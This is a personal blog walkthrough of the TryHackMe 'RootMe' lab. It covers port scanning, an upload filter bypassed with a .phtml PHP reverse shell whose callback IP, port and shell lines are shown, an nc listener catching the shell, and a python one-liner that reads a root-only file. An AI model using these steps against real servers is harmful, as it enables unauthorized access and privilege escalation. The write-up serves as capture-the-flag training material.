---
tagline: rootme
title: THM | RootMe 
description: Another THM Privilege Escalation Machine 🔓
banner: /blog/rootmebanner.jpeg/
banner_alt: Root Me Banner (if u find this, send 4533454352234 to me in general to get a pinned message)
date: '2024-02-28'
---

## Nmap Scan

```bash:Terminal
┌──(vipin㉿vipin)-[~]
└─$ sudo nmap -sS -sV 10.10.102.215
[sudo] password for vipin: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-27 23:18 EST
Nmap scan report for 10.10.102.215
Host is up (0.19s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.29 seconds
```

- We know that ports 22 & 80 are open, 22 is running ssh, and 80 is running http with *Apache 2.4.29*.

## Dirsearch

- While the room advises us to utilize *Gobuster*, I will instead use *Dirsearch*.

![Image showing the results of dirsearch](/blog/rootmepics/dirsearch.png 'Fig.1')

- The only hidden directory here is */panel/*

## Obtaining the User Flag

- When accessing */panel/*, we are greeted with a upload panel

![Image showing the upload panel](/blog/rootmepics/uploadpanel.png 'Fig.2')

- We might need to find or create a PHP script to upload. Looking at the hint proves us correct!

- I will be using [this PHP reverse shell script](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) for my attack. Make sure to change lines 49 & 50 with your Desired port & IP also change 54 with your desired shell.

``` bash:Terminal
49 $ip = '10.2.121.184';  // CHANGE THIS
50 $port = 4444;       // CHANGE THIS
···
54 $shell = 'uname -a; w; id; /bin/bash -i';
```

- My first method of bypassing the php filter did not work (it was \`}filename{\`.png.php) and I was greeted with this.

![Image showing the upload panel angry at me](/blog/rootmepics/phpuploaddenied.png 'Fig.3')

- My next attempt was a .phtml and it uploaded! Make sure to go to */uploads* and click on the PHP script to run. AND I HAVE ACCESS!!!!

```bash:Terminal
# Note: Before I modified the script to use bash, I used sh
┌──(vipin㉿vipin)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.2.121.184] from (UNKNOWN) [10.10.102.215] 48754
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 05:09:16 up  1:05,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
cat /var/www/user.txt
THM{XXXXXXXXXXXX}
```

- Time to nap nap😴, let me finish this tmrw!

## Getting The Root Flag

- I started by running the command in the hint, with that there were only a select few that were unusual with */usr/bin/python* being one.

- Using [gtfobins file read exploit](https://gtfobins.github.io/gtfobins/python/#file-read) for python we get this.

```bash:Terminal
www-data@rootme:/$ python -c 'print(open("/root/root.txt").read())' 
python -c 'print(open("/root/root.txt").read())'
THM{XXXXXXXXXXXXXXXXXXX}
```

## Closure

Hope you enjoyed this writeup, I enjoyed it very much and found the [Python File read exploit]((https://gtfobins.github.io/gtfobins/python/#file-read)) fun. Feel free to check out more @ other writeups [here](https://www.vipinb.xyz/blog)! 

